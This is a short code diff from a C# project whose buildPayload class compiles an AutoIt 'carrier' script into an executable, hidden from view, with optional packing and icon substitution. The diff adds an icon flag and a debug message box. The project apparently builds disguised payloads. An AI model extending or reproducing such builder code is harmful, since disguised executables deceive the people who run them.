@@ -10,6 +10,7 @@ namespace masamangalternatibo {
 
         public string script, drive;
         public int overflowCount, spoofMode;
+        public bool isicon;
 
         public buildPayload() {
             InitializeComponent();
@@ -30,7 +31,8 @@ namespace masamangalternatibo {
                     _sw.Close();
                 }
                 using (Form1 _f1 = new Form1()) {
-                    ProcessStartInfo _compilepsi = new ProcessStartInfo("compiler.exe", @"/in ""$carrier.au3"" /out ""$carrier.exe"" /comp 4 " + (rb32bit.Checked ? "/x86 " : "/x64 ") + (_f1.excomp[1] ? @"/pack " : "") + (_f1.imgFileIcon.Image != null ? "" : @"/icon ""$tmp.ico"""));
+                    ProcessStartInfo _compilepsi = new ProcessStartInfo("compiler.exe", @"/in ""$carrier.au3"" /out ""$carrier.exe"" /comp 4 " + (rb32bit.Checked ? "/x86 " : "/x64 ") + (_f1.excomp[1] ? @"/pack " : "") + (isicon ? @"/icon ""$tmp.ico""" : ""));
+                    MessageBox.Show(_compilepsi.Arguments);
                     _compilepsi.WindowStyle = ProcessWindowStyle.Hidden;
                     Process _cpsihndl = Process.Start(_compilepsi);
                     _cpsihndl.WaitForExit();
